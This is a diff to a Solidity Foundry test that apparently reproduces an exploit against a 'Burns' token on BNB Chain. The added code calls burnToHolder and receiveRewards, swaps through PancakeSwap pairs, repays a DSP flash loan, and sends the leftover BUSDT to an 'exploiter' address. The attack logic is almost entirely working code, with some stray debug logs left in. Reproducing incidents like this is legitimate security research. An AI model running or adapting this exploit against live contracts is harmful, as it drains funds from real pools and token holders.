@@ -91,6 +91,15 @@ contract ContractTest is Test {
         BurnsBuild.burnToHolder(amounts[0], exploiter);
         amounts = PancakeRouter.getAmountsIn(amountOut2, path);
         //console2.log("amounts: ", amounts);
+        BurnsBuild.burnToHolder(amounts[0], exploiter);
+        BurnsBuild.receiveRewards(address(this));
+        WBNB.deposit{value: address(this).balance}();
+
+        WBNBToBUSDT();
+        BurnsToBUSDT();
+
+        BUSDT.transfer(address(DSP), baseAmount);
+        BUSDT.transfer(exploiter, BUSDT.balanceOf(address(this)));
     }
 
     function BUSDTToBurns(uint256 amount) private {
@@ -112,7 +121,45 @@ contract ContractTest is Test {
             _reserveWBNB,
             reserveBurns
         );
+        console2.log("amountBurns: ",amountBurns);
         Burns_WBNB.swap(amountBurns, 0, address(this), "");
+         console2.log("fffff: ");
+    }
+
+    function WBNBToBUSDT() private {
+        uint256 amountWBNB = WBNB.balanceOf(address(this));
+        WBNB.transfer(address(BUSDT_WBNB), amountWBNB);
+        (uint112 reserveBUSDT, uint112 reserveWBNB, ) = BUSDT_WBNB
+            .getReserves();
+        uint256 amountBUSDT = PancakeRouter.getAmountOut(
+            amountWBNB,
+            reserveWBNB,
+            reserveBUSDT
+        );
+        console2.log("amountBUSDT 2: ", amountBUSDT);
+        BUSDT_WBNB.swap(amountBUSDT, 0, address(this), "");
+        console2.log("111111 2: ");
+    }
+
+    function BurnsToBUSDT() private {
+        Burns.transfer(address(Burns_WBNB), Burns.balanceOf(address(this)));
+        (uint112 reserveBurns, uint112 reserveWBNB, ) = Burns_WBNB
+            .getReserves();
+        uint256 amountWBNB = PancakeRouter.getAmountOut(
+            Burns.balanceOf(address(Burns_WBNB)) - reserveBurns,
+            reserveBurns,
+            reserveWBNB
+        );
+        Burns_WBNB.swap(0, amountWBNB, address(BUSDT_WBNB), "");
+        (uint112 reserveBUSDT, uint112 _reserveWBNB, ) = BUSDT_WBNB
+            .getReserves();
+
+        uint256 amountBUSDT = PancakeRouter.getAmountOut(
+            amountWBNB,
+            _reserveWBNB,
+            reserveBUSDT
+        );
+        BUSDT_WBNB.swap(amountBUSDT, 0, address(this), "");
     }
 
     receive() external payable {}
